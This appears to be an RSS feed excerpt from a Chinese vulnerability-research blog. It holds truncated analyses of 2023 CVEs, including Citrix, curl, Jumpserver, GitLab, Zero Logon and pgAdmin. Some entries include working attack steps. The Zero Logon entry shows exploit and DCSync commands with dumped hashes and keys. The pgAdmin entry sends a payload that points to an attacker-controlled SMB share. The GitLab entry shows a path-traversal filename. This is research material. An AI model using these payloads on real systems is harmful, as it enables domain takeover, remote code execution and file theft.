export C_INCLUDE_PATH=/usr/include/libxml2 export CPLUS_INCLUDE_PATH=/usr/include/libxml2 ./configure &amp;#39;--build=x86_64-linux-gnu&amp;#39; &amp;#39;--prefix=/root/squid/squid-6.3/build&amp;#39; &amp;#39;--includedir=${prefix}/include&amp;#39; &amp;#39;--mandir=${prefix}/share/man&amp;#39; &amp;#39;--infodir=${prefix}/share/info&amp;#39; &amp;#39;--sysconfdir=/etc&amp;#39; &amp;#39;--localstatedir=/var&amp;#39; &amp;#39;--disable-option-checking&amp;#39; &amp;#39;--disable-silent-rules&amp;#39; &amp;#39;--libdir=${prefix}/lib/x86_64-linux-gnu&amp;#39; &amp;#39;--runstatedir=/run&amp;#39; &amp;#39;--disable-maintainer-mode&amp;#39; &amp;#39;--disable-dependency-tracking&amp;#39; &amp;#39;BUILDCXXFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations -Wdate-time -D_FORTIFY_SOURCE=2 -Wl,-z,relro -Wl,-z,now &amp;#39; &amp;#39;BUILDCXX=g++&amp;#39; &amp;#39;--with-build-environment=default&amp;#39; &amp;#39;--enable-build-info=Debian linux&amp;#39; &amp;#39;--datadir=/usr/share/squid&amp;#39; &amp;#39;--sysconfdir=/etc/squid&amp;#39; &amp;#39;--libexecdir=/usr/lib/squid&amp;#39; &amp;#39;--mandir=/usr/share/man&amp;#39; &amp;#39;--enable-inline&amp;#39; &amp;#39;--disable-arch-native&amp;#39; &amp;#39;--enable-async-io=8&amp;#39; &amp;#39;--enable-storeio=ufs,aufs,diskd,rock&amp;#39; &amp;#39;--enable-removal-policies=lru,heap&amp;#39; &amp;#39;--enable-delay-pools&amp;#39; &amp;#39;--enable-icap-client&amp;#39; &amp;#39;--enable-follow-x-forwarded-for&amp;#39; &amp;#39;--enable-auth-basic=DB,fake,getpwnam,LDAP,NCSA,PAM,POP3,RADIUS,SASL,SMB&amp;#39; &amp;#39;--enable-auth-digest=file,LDAP&amp;#39; &amp;#39;--enable-auth-negotiate=wrapper&amp;#39; &amp;#39;--enable-auth-ntlm=fake,SMB_LM&amp;#39; &amp;#39;--enable-external-acl-helpers=file_userip,LDAP_group,SQL_session,unix_group,wbinfo_group&amp;#39; &amp;#39;--enable-security-cert-validators=fake&amp;#39; &amp;#39;--enable-storeid-rewrite-helpers=file&amp;#39; &amp;#39;--enable-url-rewrite-helpers=fake&amp;#39; &amp;#39;--enable-eui&amp;#39; &amp;#39;--enable-esi&amp;#39; &amp;#39;--enable-zph-qos&amp;#39; &amp;#39;--disable-translation&amp;#39; &amp;#39;--with-swapdir=/var/spool/squid&amp;#39; &amp;#39;--with-logdir=/var/log/squid&amp;#39; &amp;#39;--with-pidfile=/run/squid.</description></item><item><title>CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/</link><pubDate>Thu, 26 Oct 2023 10:18:12 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/</guid><description>基本信息 Citrix中存在信息泄露漏洞，由于越界读取，未经授权的攻击者可以利用该漏洞获取到存储在内存的密钥。
该漏洞在八月下旬观察到在野利用。
其他
这个漏洞在10.19就已经分析完了，当时扫描了一下公网受影响服务器发现影响比较大，所以没有公开详情，在昨天国外安全研究员公开了PoC，所以现在才写分析文章。
指纹 hunter
web.title=&amp;#34;Citrix Gateway&amp;#34; 影响版本 NetScaler ADC and NetScaler Gateway 14.1 &amp;lt; 14.1-8.50 NetScaler ADC and NetScaler Gateway 13.1 &amp;lt; 13.1-49.15 NetScaler ADC and NetScaler Gateway 13.0 &amp;lt; 13.0-92.19 NetScaler ADC 13.1-FIPS &amp;lt; 13.1-37.164 NetScaler ADC 12.1-FIPS &amp;lt; 12.1-55.300 NetScaler ADC 12.1-NDcPP &amp;lt; 12.1-55.300 环境搭建 参照CVE-2023-3519 Citrix Gateway RCE搭建
14.1-4.42 192.168.52.100
14.1-8.50 192.168.52.105
13.1-49.15 192.168.52.95
技术分析&amp;amp;调试 初步分析
根据官方通告可知两个漏洞都是对内存的操作不当造成的。对应的CVSS3分别如下
CVE-2023-4966 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L CVE-2023-4967 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H 综合可以知道如下信息： 利用漏洞无需权限、使用网络请求即可利用、均为内存型漏洞，应该跟[[CVE-2023-3519 Citrix Gateway RCE|CVE-2023-3519)类似，对用户输入没做校验，其中CVE-2023-4966 应该是实现了越界读取内存。 函数diff diff nsppe文件，分析各个函数修改的地方。</description></item><item><title>CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/</link><pubDate>Fri, 13 Oct 2023 15:11:25 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/</guid><description>基本信息 利用 HTTP/2 的多路复用流功能，恶意攻击者可通过快速创建请求并立即重置请求，绕过最大并发流限制，导致服务器资源的过度消耗。
影响范围 Go &amp;lt; 1.21.3 Go &amp;lt; 1.20.10
11.0.0-M1 &amp;lt;= Apache Tomcat &amp;lt;= 11.0.0-M11 10.1.0-M1 &amp;lt;= Apache Tomcat &amp;lt;= 10.1.13 9.0.0-M1 &amp;lt;= Apache Tomcat &amp;lt;= 9.0.80 8.5.0 &amp;lt;= Apache Tomcat &amp;lt;= 8.5.9
grpc-go &amp;lt; 1.58.3 grpc-go &amp;lt; 1.57.1 grpc-go &amp;lt; 1.56.3
环境搭建 使用go起一个http2 server。
package main import ( &amp;#34;fmt&amp;#34; &amp;#34;net/http&amp;#34; ) func main() { http.HandleFunc(&amp;#34;/&amp;#34;, func(w http.ResponseWriter, r *http.Request) { fmt.Println(r.Proto, r.URL) fmt.Fprint(w, &amp;#34;Hello World!&amp;#34;) }) http.ListenAndServeTLS(&amp;#34;:443&amp;#34;, &amp;#34;certs/cert.</description></item><item><title>CVE-2023-38545 Curl 堆溢出漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/</link><pubDate>Wed, 11 Oct 2023 20:40:32 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/</guid><description>基本信息 在libcurl中存在堆溢出漏洞，当libcurl通过socks5代理发送请求时，如果hostname大于255则会在本地解析，但由于状态机错误导致没有按照预期解析，而是把主机名拷贝到缓冲区中，攻击者可以通过构造超长主机名触发堆溢出。
影响版本 7.69.0 &amp;lt;= libcurl &amp;lt;= 8.3.4
环境搭建 sudo apt-get build-dep curl autoreconf ./configure --with-openssl --prefix=$HOME/code/c/curl-8.3.0/build --enable-debug make -j 16 make install 技术分析&amp;amp;调试 补丁 漏洞在fb4415d8aee6c1045be932a34fe6107c2f5ed147修复，修复代码如下 从修复代码中可以看出两个区别
当socks5_resolve_local=false and hostname_len &amp;gt;255 时返回CURLPX_LONG_HOSTNAME错误码，而原先逻辑为将socks5_resolve_local设为true 将hostname_len转为unsigned char后赋值给socksreq[len++] 修复代码位于do_SOCKS5函数，该函数由connect_SOCKS函数调用 static CURLcode connect_SOCKS(struct Curl_cfilter *cf, struct socks_state *sxstate, struct Curl_easy *data) { ...... switch(conn-&amp;gt;socks_proxy.proxytype) { case CURLPROXY_SOCKS5: case CURLPROXY_SOCKS5_HOSTNAME: pxresult = do_SOCKS5(cf, sxstate, data); break; 向上追溯connect_SOCKS由socks_proxy_cf_connect调用，socks_proxy_cf_connect被存储在了一个结构体中
static CURLcode socks_proxy_cf_connect(struct Curl_cfilter *cf, struct Curl_easy *data, bool blocking, bool *done) { CURLcode result; struct connectdata *conn = cf-&amp;gt;conn; int sockindex = cf-&amp;gt;sockindex; struct socks_state *sx = cf-&amp;gt;ctx; if(cf-&amp;gt;connected) { *done = TRUE; return CURLE_OK; } result = cf-&amp;gt;next-&amp;gt;cft-&amp;gt;do_connect(cf-&amp;gt;next, data, blocking, done); if(result || !</description></item><item><title>CVE-2023-4863 Libwebp Rce 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/</link><pubDate>Sat, 07 Oct 2023 10:23:56 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/</guid><description>Created at 2023-10-07T10:23:56+08:00</description></item><item><title>CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/</link><pubDate>Fri, 29 Sep 2023 20:32:52 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/</guid><description>基本信息 jumpserver中第三方库向用户公开了随机库所用的seed，并且没有限制重置密码接口的次数，导致攻击者可以获取到随机库的随机种子并尝试预测重置密码的验证码，进而重置任意用户密码。 利用该漏洞需要已知用户名和对应的邮箱。
指纹 hunter
web.title=&amp;#34;jumpserver&amp;#34; 影响版本 CVE-2023-42820 v2.24 - v3.6.4 环境搭建 参考https://github.com/jumpserver/Dockerfile，将版本改为3.6.4，使用docker启动即可。
技术分析&amp;amp;调试 补丁分析 漏洞在commit 0eba6d2175ab752399c5aee2dbaaf311bf0a398d修复，查看补丁，可知在apps/common/utils/random.py#random_string处增加了 random.seed()调用，同时对 apps/users/models/user.py#generate_reset_token生成token改为增加了 random.seed调用的random_string函数 到这里只能隐约猜到是一个密码学有关的漏洞，应该可以通过爆破利用。
技术分析 在前两天有师傅写出了分析，才恍然大悟。
根据jumpserver最新re-auth复现（伪随机经典案例）可知在本例的jumpserver中在如下地方生成重置密码时的验证码，其中使用了本次修复的函数 random_string生成6位，范围为000000-999999的数字验证码
opt/jumpserver/apps/authentication/api/password.py def create(self, request, *args, **kwargs): token = request.GET.get(&amp;#39;token&amp;#39;) userinfo = cache.get(token) if not userinfo: return HttpResponseRedirect(reverse(&amp;#39;authentication:forgot-previewing&amp;#39;)) serializer = self.get_serializer(data=request.data) serializer.is_valid(raise_exception=True) username = userinfo.get(&amp;#39;username&amp;#39;) form_type = serializer.validated_data[&amp;#39;form_type&amp;#39;] code = random_string(6, lower=False, upper=False) with open(&amp;#34;/tmp/code&amp;#34;,&amp;#34;a&amp;#34;) as f: f.write(code+&amp;#34;\n&amp;#34;) other_args = {} target = serializer.validated_data[form_type] if form_type == &amp;#39;sms&amp;#39;: query_key = &amp;#39;phone&amp;#39; target = target.</description></item><item><title>瑞友天翼 Rce分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/</link><pubDate>Wed, 20 Sep 2023 10:04:31 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/</guid><description>基本信息 瑞友天翼中存在SQL注入漏洞，攻击者可以利用SQL注入写入webshell，控制目标服务器。
环境搭建 略
影响版本 略
技术分析 数据库基本信息
127.0.0.1:5873 db: CASSystemDS pwd: F1B5214C user: admin 在ConsoleExternalApi.XGI中根据代码逻辑可得，请求中需携带initparams、key、sign等参数
$initparams = $_REQUEST[&amp;#39;initParams&amp;#39;]; $key = $_REQUEST[&amp;#39;key&amp;#39;]; $sign = $_REQUEST[&amp;#39;sign&amp;#39;]; 参数校验逻辑如下，此时直接使用key=inner绕过判断，则$keyVal值为Realor，下面拼接了$initparams和$keyVal并计算其md5值是否和sign变量相同。
if ($key == &amp;#34;wusuokey&amp;#34;) { $keyVal = $COMCASWEB-&amp;gt;getfarminfo($key); } else if ($key == &amp;#34;inner&amp;#34;) { $keyVal = &amp;#34;Realor&amp;#34;; } if (!isset($keyVal) || empty($keyVal)) { write_log(&amp;#34;{&amp;#39;参数非法&amp;#39;:&amp;#39;key值为空&amp;#39;}&amp;#34;); exitErrorJson(&amp;#39;参数非法&amp;#39;); } $signCalculate = md5($initparams . $keyVal); //testLog(&amp;#34;signCalculate=&amp;#34; . $signCalculate); if ($signCalculate != $sign) { write_log(&amp;#34;{&amp;#39;参数非法&amp;#39;:&amp;#39;参数加密方法错误&amp;#39;}&amp;#34;); exitErrorJson(&amp;#39;参数非法&amp;#39;); } 之后使用两个下划线分割$initparams变量，存入数组并遍历数组</description></item><item><title>CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/</link><pubDate>Tue, 19 Sep 2023 10:26:14 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/</guid><description>基本信息 Windows error resporting service中存在权限提升漏洞，当攻击者可以创建符号链接及目录时，可以利用这个漏洞提升至SYSTEM权限。
影响版本 略
环境搭建 Windows 10 21H2 6月补丁 技术分析&amp;amp;调试 补丁对比 diff wercplsupport.dll，主要改了CWerComReport::SubmitReport，wercplsupport.dll是Windows error reporting 服务的主dll文件。
对比发现补丁直接阻断了后续CAutoImpersonate::ImpersonateUserHighestPrivs和CWerComReport::_SubmitReport的调用
//未修复 __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v10; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v10 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)&amp;amp;v12), v10 &amp;gt;= 0) ) { v10 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)&amp;amp;v12); return (unsigned int)v10; } // 修复代码 __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v11; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; if ( (unsigned __int8)wil::details::FeatureImpl&amp;lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport&amp;gt;::__private_IsEnabled(&amp;amp;`wil::Feature&amp;lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport&amp;gt;::GetImpl&amp;#39;::`2&amp;#39;::impl) ) return 0x80004001i64; v12 = 2; if ( !</description></item><item><title>CVE-2023-38148 Windows Ics Rce分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/</link><pubDate>Mon, 18 Sep 2023 16:18:40 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/</guid><description>基本信息 依赖于ICS服务，Internet Connect Sharing，对应注册表，依赖ipnathlp.dll
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess 漏洞存在于处理DHCP请求时，由于没有检查边界，导致在使用memset时使用的长度参数来源于数据包内，可以导致栈溢出。 服务调试参考第二个参考链接。
影响版本 略
环境搭建 参考 https://github.com/ruijanlee/h3cc/blob/master/h3cc_ruijanlee/doc/c8.md ，同时加一个Linux，网卡使用第二个网卡，使得Linux发出的DHCP包能够被Windows接收到。
技术分析&amp;amp;调试 静态分析 对比补丁修复前后的逻辑，有两个明显的不同点，有两种产生漏洞的可能的地方。
在修复版本中在进行 if ( *((_BYTE *)a2 + 230) &amp;gt; 0x20u )判断之前先调用了 DumpDhcpHeaderInfo，在漏洞代码中先进行判断在调用DumpDhcpHeaderInfo 在修复版本中如果满足 if ( *((_BYTE *)a2 + 230) &amp;gt; 0x20u ) 则进入if内，在结束if语句时会通过跳转略过一部分处理逻辑，而在未修复版本内则还会继续处理。 可以看出 a2 + 230为_NH_BUFFER 结构体内的某个长度字段，该处为判断这个长度字段存储的长度，该漏洞应该是溢出漏洞，并且在产生漏洞的地方需要读取该字段。
所以漏洞应该是第二点所说的，产生在略过的逻辑中。
// 未修复代码 void __fastcall DhcpProcessMessage(struct _DHCP_INTERFACE *a1, struct _NH_BUFFER *a2) { ...... memset_0(&amp;amp;v12, 0, 0x40ui64); if ( *((_BYTE *)a2 + 230) &amp;gt; 0x20u ) { if ( v4 !</description></item><item><title>CVE-2023-3519 Cirtix Gateway RCE分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/</link><pubDate>Thu, 27 Jul 2023 10:48:40 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/</guid><description>基本信息 Citrix ADC 及 Citrix Gateway 中存在缓冲区溢出漏洞，未授权的攻击者可以通过发送特殊请求触发漏洞，造成RCE。
影响版本 NetScaler ADC 、NetScaler Gateway 13.1 &amp;lt; 13.1-49.13 NetScaler ADC 、NetScaler Gateway 13.0 &amp;lt; 13.0-91.13 NetScaler ADC 13.1-FIPS &amp;lt; 13.1-37.159 NetScaler ADC 12.1-FIPS &amp;lt; 12.1-55.297 NetScaler ADC 12.1-NDcPP &amp;lt; 12.1-55.297
环境搭建 申请开发者试用，配置Citrix Gateway 技术分析&amp;amp;调试 根据国外安全研究员研究，该漏洞存在于/netscaler/nsppe文件内，diff修复前和修复后的nsppe，主要修改了ns_aaa_gwtest_get_event_and_target_names等几个函数 转到ns_aaa_gwtest_get_event_and_target_names函数，对比修复和未修复的代码，主要在调用ns_aaa_saml_url_decode函数时对v29添加了校验。 跟进ns_aaa_saml_url_decode函数，进入ns_aaa_saml_url_decode_inner
__int64 __fastcall ns_aaa_saml_url_decode(__int64 a1, __int64 a2, __int64 a3) { return ns_aaa_saml_url_decode_inner(a1, a2, a3, 1LL); } 在ns_aaa_saml_url_decode_inner函数中a1是一个char指针，指向了http请求的url，在do while循环时遍历a1数组，当当前a1指向的字符是%，则获取到该字符后面两个字符通过datatable_ascii2bin得到对应的字符并写入到v4指向的数组内，实际上这里是url解码操作，解码后写入v4数组。 如果当前字符不是%则判断是不是+号，是+号则在v4数组内写入空格。两个都不是则直接写入到v4内，可以看出这块代码是在对传入的字符串判断是否为url编码如果是则进行url解码，如果不是则直接写入v4数组。
__int64 __fastcall ns_aaa_saml_url_decode_inner(char *a1, _BYTE *a2, int a3, int a4) { _BYTE *v4; // rax unsigned __int64 v5; // r8 char v6; // bl char *v7; // r9 char v8; // r10 char v9; // r11 LODWORD(v4) = (_DWORD)a2; if ( a3 ) { v5 = (unsigned __int64)&amp;amp;a1[a3]; v4 = a2; do { v6 = *a1; if ( *a1 == &amp;#39;%&amp;#39; ) { v7 = a1 + 2; if ( (unsigned __int64)(a1 + 2) &amp;lt; v5 ) { v8 = a1[1]; if ( (unsigned __int8)(v8 - 48) &amp;lt;= 9u ) { v9 = *v7; if ( (unsigned __int8)(*v7 - 48) &amp;lt; 0xAu || (unsigned __int8)((v9 | 0x20) - 97) &amp;lt; 6u ) { if ( v9 !</description></item><item><title>CVE-2023-32315 Openfire 身份认证绕过漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/</link><pubDate>Tue, 20 Jun 2023 17:42:33 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/</guid><description>基本信息 Openfire中存在目录遍历漏洞，通过使用UTF-16编码的../，可以绕过身份验证，访问一些敏感接口，通过这些接口可以新建管理员，上传插件，进一步造成代码执行
影响版本 3.10.0 &amp;lt;= Openfire &amp;lt; 4.6.8 4.7.0 &amp;lt;= Openfire &amp;lt; 4.7.5
环境搭建 直接下载对应的exe安装即可
技术分析&amp;amp;调试 在Openfire中，/setup/setup-*开头的url由AuthCheckFilter处理，并且访问该url无需经过身份验证（白名单），这个Filter定义在xmppserver/src/main/java/org/jivesoftware/admin/AuthCheckFilter.java中。
&amp;lt;filter&amp;gt; &amp;lt;filter-name&amp;gt;AuthCheck&amp;lt;/filter-name&amp;gt; &amp;lt;filter-class&amp;gt;org.jivesoftware.admin.AuthCheckFilter&amp;lt;/filter-class&amp;gt; &amp;lt;init-param&amp;gt; &amp;lt;param-name&amp;gt;excludes&amp;lt;/param-name&amp;gt; &amp;lt;param-value&amp;gt; login.jsp,index.jsp?logout=true,setup/index.jsp,setup/setup-*,.gif,.png,error-serverdown.jsp,loginToken.jsp &amp;lt;/param-value&amp;gt; &amp;lt;/init-param&amp;gt; &amp;lt;/filter&amp;gt; 在xmppserver/src/main/java/org/jivesoftware/admin/AuthCheckFilter.java中通过以下代码判断是否存在目录穿越
public static boolean testURLPassesExclude(String url, String exclude) { // If the exclude rule includes a &amp;#34;?&amp;#34; character, the url must exactly match the exclude rule. // If the exclude rule does not contain the &amp;#34;?&amp;#34; character, we chop off everything starting at the first &amp;#34;?</description></item><item><title>Smartbi RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/</link><pubDate>Fri, 16 Jun 2023 16:07:41 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/smartbi-rce/</guid><description>基本信息 Smartbi是广州思迈特软件有限公司旗下的商业智能BI和数据分析品牌，为企业客户提供一站式商业智能解决方案。Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现；满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等等。
Smartbi大数据分析平台存在远程命令执行漏洞，未经身份认证的远程攻击者可利用stub接口构造请求绕过补丁限制，进而控制JDBC URL，最终可导致远程代码执行或信息泄露。
引用自奇安信NOX
影响版本 V7&amp;lt;= Smartbi &amp;lt;= V10.5.8
环境搭建 官网下载Smartbi V10.5.8即可，直接安装。
技术分析&amp;amp;调试 解包官网提供的补丁包，可以发现如下：
{ &amp;#34;version&amp;#34;: &amp;#34;1.0&amp;#34;, &amp;#34;date&amp;#34;: &amp;#34;2023-02-28 15:00:00&amp;#34;, &amp;#34;patches&amp;#34;: { &amp;#34;PATCH_20230228&amp;#34;: { &amp;#34;desc&amp;#34;: &amp;#34;修复了利用stub接口对 ‘DB2 命令执行漏洞’ 补丁进行绕过的远程命令执行漏洞 (Patch.20230228 @2023-02-28)&amp;#34;, &amp;#34;desc_zh_TW&amp;#34;: &amp;#34;修復了利用stub接口對 ‘DB2 命令執行漏洞’ 補丁進行繞過的遠程命令執行漏洞 (Patch.20230228 @2023-02-28)&amp;#34;, &amp;#34;desc_en&amp;#34;: &amp;#34;Fixed a remote command execution vulnerability in DB2 that used the stub interface (Patch.20230228 @2023-02-28)&amp;#34;, &amp;#34;urls&amp;#34;: [{ &amp;#34;url&amp;#34;: &amp;#34;*.stub&amp;#34;, &amp;#34;rules&amp;#34;: [{ &amp;#34;type&amp;#34;: &amp;#34;RejectStubPostPatchRule&amp;#34; }] }] }, &amp;#34;PATCH_20221122&amp;#34;: { &amp;#34;desc&amp;#34;: &amp;#34;修复了 DB2 命令执行漏洞 (Patch.</description></item><item><title>CVE-2023-2825 Gitlab 路径穿越漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/</link><pubDate>Fri, 26 May 2023 10:36:20 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/</guid><description>基本信息 在GitLab 中，当一个附件存在于一个项目中，并且该项目在嵌套了至少五层的组内，攻击者才可以利用这个漏洞进行目录穿越，读取服务器上的文件。
影响版本 GitLab 16.0.0
环境搭建 用docker起环境
docker pull gitlab/gitlab-ce:16.0.0-ce.0 docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.0.0-ce.0 技术分析&amp;amp;调试 一开始以为是普通的目录穿越，先diff看怎么修的，注意到16.0.1新增了spec\support\shared_examples\requests\uploads_actions_shared_examples.rb 文件。
根据该文件内容判断应该是这个漏洞的单元测试文件，没学过ruby，先把这段代码扔给ChatGPT看看
# frozen_string_literal: true RSpec.shared_examples &amp;#39;uploads actions&amp;#39; do describe &amp;#34;GET #show&amp;#34; do context &amp;#39;with file traversal in filename parameter&amp;#39; do # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET let(:filename) { &amp;#34;../../../../../../../../../Gemfile.lock&amp;#34; } let(:escaped_filename) { CGI.</description></item><item><title>Zero Logon 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/zero-logon/</link><pubDate>Mon, 08 May 2023 14:39:28 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/zero-logon/</guid><description>基本信息 Netlogon协议认证过程： 影响版本 略
环境搭建 win server 2012 技术分析&amp;amp;调试 利用 域环境使用Windows server 2012R2搭建，先用脚本重置域账户密码 python cve-2020-1472-exploit.py WIN2016 192.168.52.130 并抓取数据包 重置之后域账户的密码为空，对应hash为31d6cfe0d16ae931b73c59d7e0c089c0
安装impacket：
python3 -m pipx install impacket pipx ensurepath 使用impacket的secretsdump进行Dcsync，得到Administratr账户的NTLM hash secretsdump.py cqy.io/WIN2016\$@WIN2016 -dc-ip 192.168.52.130 -just-dc-user cqy\\administrator -hashes 31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:668d503af91aefe071e37a16e885047b::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:8996ffd41ae52dd62a3c60007d078f10eb7cd3eb5d4b74c90791c8e47eba88cb Administrator:aes128-cts-hmac-sha1-96:a3a6d348e74cee613718c2f94d404fb6 Administrator:des-cbc-md5:f732d313b5e92585 [*] Cleaning up... PoC分析 关键代码是下面这个函数，参数rpc_con是DCERPC_v5对象，描述了rcp链接，</description></item><item><title>CVE-2022-4223 PgAdmin RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/</link><pubDate>Mon, 08 May 2023 14:18:21 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/</guid><description>基本信息 pgAdmin 服务器包含一个 HTTP API，用于验证用户选择的外部 PostgreSQL 实用程序（如 pg_dump 和 pg_restore）的路径。该实用程序由服务器执行，以确定它来自哪个PostgreSQL版本。6.17 之前的 pgAdmin 版本无法正确保护此 API，这可能允许未经身份验证的用户使用他们选择的路径调用它，例如他们在 Windows 计算机上控制的服务器的 UNC 路径。这将导致目标路径中正确命名的可执行文件由 pgAdmin 服务器执行。
指纹 略
影响版本 pgadmin &amp;lt; 6.17
环境搭建 windows 10 postgresql13 技术分析&amp;amp;调试 复现 直接安装postgresql13，自带了pgadmin4，初始化环境后，使用python 启动pgadmin4，编译如下代码
#include&amp;lt;stdlib&amp;gt; int main(){ system(&amp;#34;whoami &amp;gt; c:\\users\\public\\1.txt&amp;#34;); return 0; } 编译后命名为pg_dump.exe，将其放到某个目录内，并开启文件共享。 发送如下payload，在utility_path指向共享的文件夹路径，
POST /misc/validate_binary_path HTTP/1.1 Host: [TARGETHOST] Cookie: [COOKIES_YOU_FETCHED_IN_ADVANCE] X-pgA-CSRFToken: [CSRF_TOKEN_YOU_FETCHED_IN_ADVANCE] Connection: close Referer: https://[TARGETHOST]/browser/ Content-Length: [n] Content-Type: application/json {&amp;#34;utility_path&amp;#34;:&amp;#34;\\\\[ATTACKER_IP]\\[PREFERED_SHARE_NAME]&amp;#34;} 分析 在 validate_binary_path路由对应的处理函数如下，这个函数接收POST请求，而后获取到body里面的 utility_path，这个函数接收 utility_path并使用 os.path.abspath(os.path.join拼接路径，而 os.path.join可以接受[[UNC路径]]，所以我们可以搭建一个SMB服务器并在上面有 pg_dump.</description></item><item><title>Strapi RCE 漏洞链分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/strapi-rce/</link><pubDate>Fri, 05 May 2023 21:06:55 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/strapi-rce/</guid><description>基本信息 该漏洞利用链由两个漏洞组成：Strapi 远程代码执行漏洞(CVE-2023-22621)和Strapi 信息泄露漏洞(CVE-2023-22894)
Strapi 远程代码执行漏洞(CVE-2023-22621)为后台SSTI模板注入，在Strapi管理面板的Users &amp;amp; Permissions plugin可以设置确认邮件模板，在模板处存在模板注入，当开启邮件确认选项时将渲染该模板，触发漏洞，利用该漏洞需要后台管理员权限，以修改模板。
Strapi 信息泄露漏洞(CVE-2023-22894)，Strapi 信息泄露漏洞(CVE-2023-22894)是由于Strapi在查询时，只是在查询结果中删除了敏感字段，在实际查询语句中仍然可以使用该敏感字段，所以攻击者可以通过观察Strapi服务端返回的数据，猜测所输入的敏感字段是否正确，即攻击者可以通过暴力破解，将敏感字段爆破出来
